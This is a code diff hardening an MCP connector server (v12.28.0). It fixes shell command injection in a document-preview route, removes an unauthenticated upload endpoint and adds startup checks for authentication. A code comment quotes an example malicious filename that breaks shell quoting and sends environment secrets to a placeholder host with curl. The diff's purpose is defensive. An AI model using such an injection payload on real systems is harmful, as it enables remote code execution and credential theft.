   // ── For .docx: look for a matching .html first (fast path) ─────────────────
   if ( ext === '.docx' ) {
     const htmlName = safeName.replace( /\.docx$/i, '.html' );
-    const htmlPath = pathJoin( dlDir, htmlName );
-    if ( existsSync( htmlPath ) ) {
+    const htmlPath = resolveContained( dlDir, htmlName );
+    if ( htmlPath && existsSync( htmlPath ) ) {
       res.setHeader( 'Content-Type', 'text/html; charset=utf-8' );
       return res.send( readFileSync( htmlPath, 'utf-8' ) );
     }
 
     // Fallback: run preview_extract.py for legacy .docx with no paired .html
-    const docxPath = pathJoin( dlDir, safeName );
-    if ( !existsSync( docxPath ) ) {
+    const docxPath = resolveContained( dlDir, safeName );
+    if ( ! docxPath || !existsSync( docxPath ) ) {
       return res.status( 404 ).json( { error: `File not found: ${ safeName }` } );
     }
 
     let extracted;
     try {
-      const stdout = execSync(
-        `python3 /data/skill/ava/scripts/preview_extract.py "${ docxPath }"`,
-        { timeout: 15000, encoding: 'utf-8' }
+      // v12.28.0 (TNX-C-010 item 1): execSync invoked /bin/sh -c with the
+      // filename interpolated into a double-quoted shell string, so a name
+      // such as  a";curl evil.test/$(cat /proc/self/environ|base64);"b.docx
+      // broke out of the quoting and executed as the `mcp` user, which owns
+      // the application source and the /data volume.
+      //
+      // execFileSync passes an argument array straight to execve. No shell is
+      // involved at any point, so shell metacharacters in the filename are
+      // inert data. This eliminates the vulnerability class rather than
+      // filtering for it, and the strict filename validation above is a second,
+      // independent layer rather than the primary control.
+      const stdout = execFileSync(
+        PREVIEW_PYTHON_BIN,
+        [ PREVIEW_EXTRACT_SCRIPT, docxPath ],
+        { timeout: 15000, encoding: 'utf-8', maxBuffer: 8 * 1024 * 1024 }
       );
       extracted = JSON.parse( stdout );
     } catch ( err ) {
@@ -2755,23 +3353,42 @@ app.get( '/preview/:filename', async ( req, res ) => {
   return res.send( `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>${ esc(safeName) }</title><style>body{font-family:sans-serif;max-width:600px;margin:60px auto;padding:20px;text-align:center}a{display:inline-block;color:#fff;padding:12px 24px;background:#2563eb;text-decoration:none;border-radius:6px}</style></head><body><h2>${ esc(safeName) }</h2><p>This file type cannot be previewed.</p><a href="/download/${ encodeURIComponent(safeName) }?token=${ encodeURIComponent(token) }" target="_parent">Download File</a></body></html>` );
 } );
 
-// ── Binary file upload endpoint (base64, no multer needed) ──────────────
-app.post('/data/upload-binary', (req, res) => {
-  const { filename, data } = req.body || {};
-  if (!filename || !data) {
-    return res.status(400).json({ error: 'filename and base64 data required.' });
-  }
-  try {
-    const dir = '/data/uploads';
-    if (!existsSync(dir)) mkdirSync(dir, { recursive: true, mode: 0o755 });
-    const buf = Buffer.from(data, 'base64');
-    writeFileSync(pathJoin(dir, basename(filename)), buf);
-    log('info', `upload-binary: saved ${filename} (${buf.length} bytes)`);
-    return res.json({ success: true, filename, size: buf.length });
-  } catch (err) {
-    log('error', `upload-binary write error: ${err.message}`);
-    return res.status(500).json({ error: err.message });
-  }
+// ---------------------------------------------------------------------------
+// REMOVED in v12.28.0 -- POST /data/upload-binary  (TNX-C-003)
+//
+// This endpoint accepted a filename and base64 payload with no authentication,
+// no extension policy and no size limit beyond the 50mb global body cap. It
+// wrote directly to the persistent volume, entirely bypassing the sibling
+// POST /data/upload handler, which applies UPLOAD_ALLOWED_EXTS /
+// UPLOAD_DENIED_EXTS and sanitises the filename with [^a-zA-Z0-9._-] -> '_'.
+//
+// Three compounding effects made this Critical:
+//   1. Unauthenticated write of any file type to the persistent volume,
+//      including the .py, .sh and .exe extensions the sibling denylist exists
+//      specifically to refuse.
+//   2. No quota, so repeated posts exhausted the volume shared with the memory
+//      store, the schedule store and the download directory.
+//   3. basename() strips directory separators but preserves quotes, semicolons,
+//      backticks, $ and spaces, so it was the primitive that created a file
+//      whose NAME contained shell metacharacters. GET /preview/:filename then
+//      interpolated that name into an execSync shell string (TNX-C-010). The
+//      two findings composed into unauthenticated remote code execution.
+//
+// The endpoint is deleted rather than patched. POST /data/upload already
+// provides the function correctly. Callers that were posting binary content
+// here must switch to POST /data/upload with { filename, content_base64 }.
+//
+// The 410 handler below is deliberate: a 404 would look like a routing fault
+// and invite retries, whereas 410 Gone states that the resource was removed on
+// purpose and gives the caller the replacement.
+// ---------------------------------------------------------------------------
+app.post('/data/upload-binary', (_req, res) => {
+  log('warn', 'upload-binary: call to removed endpoint refused (TNX-C-003)');
+  return res.status(410).json({
+    error:       'This endpoint was removed in v12.28.0 for security reasons (TNX-C-003).',
+    code:        'ENDPOINT_REMOVED',
+    replacement: 'POST /data/upload with { filename, content_base64, mime_type }',
+  });
 });
 // GET /tools — tool manifest for Tenax gateway discovery (v2.4.4+)
 app.get('/tools', async (req, res) => {
@@ -3302,12 +3919,61 @@ app.use((_req, res) => {
 });
 
 // -----------------------------------------------------------------------
+// Pre-flight security gate  (v12.28.0 -- TNX-C-001 resolution items 2 and 4)
+//
+// Two assertions run BEFORE the listener is bound. Both are fatal.
+//
+//   1. assertMcpAuthConfigured() refuses to continue without a usable
+//      MCP_API_KEY. The connector exposes remote Python execution, Google
+//      Drive with full drive scope, WordPress publishing and SMTP dispatch.
+//      A connector that starts without a key is the defect, so there is
+//      deliberately no environment variable that suppresses this check.
+//
+//   2. assertAllRoutesCovered(app) walks the Express router stack and fails
+//      the boot if any registered route was mounted ahead of the auth gate
+//      without appearing on the documented allowlist. The class of bug behind
+//      TNX-C-001 was not "someone forgot a check", it was "nothing verified
+//      that checks existed", so the verification IS the remediation.
+//
+// Exiting non-zero here is what makes a misconfigured deploy fail loudly at
+// the orchestrator instead of quietly serving an open tool surface.
+// -----------------------------------------------------------------------
+try {
+  assertMcpAuthConfigured();
+} catch (err) {
+  console.error("[FATAL] Connector authentication is not configured.");
+  console.error(err.message);
+  process.exit(1);
+}
+
+try {
+  const coverage = assertAllRoutesCovered(app);
+  const allowlist = describeAuthAllowlist();
+  log("info", `Auth gate: ACTIVE | ${coverage.checked} routes verified | ` +
+    `public: ${allowlist.public.length} | self-authenticated: ${allowlist.selfAuthenticated.length}`);
+} catch (err) {
+  console.error("[FATAL] Route authentication coverage assertion failed.");
+  console.error(err.message);
+  process.exit(1);
+}
+
+// -----------------------------------------------------------------------
 // Start
 // -----------------------------------------------------------------------
 const httpServer = createServer(app);
+
+// v12.28.0 (TNX-H-006 item 4): the four Node HTTP timeouts. The connector had
+// none of them set, so keepAliveTimeout sat at Node's 5s default, below the
+// idle timeout of essentially every reverse proxy. The proxy reused a socket
+// Node had already decided to close, and the client saw an unexplained
+// ECONNRESET -- exactly the symptom the gateway's own comments describe having
+// diagnosed and fixed on its side.
+applyServerTimeouts(httpServer, { log });
+
 httpServer.listen(PORT, HOST, () => {
-  log("info", `claude-connector v12.8.2 on http://${HOST}:${PORT}`);
-  log("info", `MCP: http://${HOST}:${PORT}/mcp (NO auth - open for claude.ai)`);
+  log("info", `claude-connector v12.28.0 on http://${HOST}:${PORT}`);
+  log("info", `MCP: http://${HOST}:${PORT}/mcp (Authorization: Bearer <MCP_API_KEY> REQUIRED)`);
+  log("info", `CORS: ${MCP_ALLOWED_ORIGINS.length ? MCP_ALLOWED_ORIGINS.join(", ") : "no origins configured (all cross-origin browser requests blocked)"}`);
   log("info", `LinkedIn OAuth: ${config.linkedinClientId ? "CONFIGURED" : "not configured"}`);
   log("info", `Email send: ${config.emailSendEnabled ? "ENABLED" : "disabled"} | ` +
     `HTML: ${config.emailHtmlEnabled ? "ENABLED" : "disabled"} | ` +
@@ -3402,5 +4068,48 @@ httpServer.listen(PORT, HOST, () => {
   }
 });
 
-process.on("SIGINT",  () => { httpServer.close(() => process.exit(0)); });
-process.on("SIGTERM", () => { httpServer.close(() => process.exit(0)); });
+// ---------------------------------------------------------------------------
+// Graceful shutdown  (v12.28.0 -- TNX-H-006)
+//
+// This replaces:
+//
+//     process.on("SIGINT",  () => { httpServer.close(() => process.exit(0)); });
+//     process.on("SIGTERM", () => { httpServer.close(() => process.exit(0)); });
+//
+// which was the complete process handling for this service. It looks correct
+// and is not. httpServer.close() waits INDEFINITELY for open connections to
+// end, and this connector serves SSE, which by definition does not end. The
+// callback was therefore never invoked, the process never exited, Railway
+// SIGKILLed it after the grace period, and every in-flight tool call -- including
+// long-running script_execute invocations -- was severed mid-frame. The old
+// handler did not merely fail to drain; it guaranteed a hard kill on every
+// redeploy.
+//
+// The replacement fails readiness, waits for the platform to deregister,
+// notifies and then destroys SSE sockets so close() can actually return,
+// flushes the schedule store, and holds an unref'd forced-exit deadline.
+// ---------------------------------------------------------------------------
+installShutdownHandlers({
+  server: httpServer,
+  log,
+
+  // Both transports hold open responses. Legacy SSE keeps its transports in
+  // sseSessions; Streamable HTTP keeps them in streamableSessions. Both must be
+  // torn down or close() blocks on whichever was missed.
+  getSseSessions: () => [
+    ...Object.values(sseSessions || {}),
+    ...Object.values(streamableSessions || {}),
+  ],
+
+  flushHooks: [
+    {
+      name: 'schedule store',
+      run: () => {
+        // The in-process cron scheduler persists on every mutation, but a
+        // mutation in flight when SIGTERM arrives has not reached its own
+        // save yet. Flushing here closes that window.
+        return flushScheduleStore();
+      },
+    },
+  ],
+});
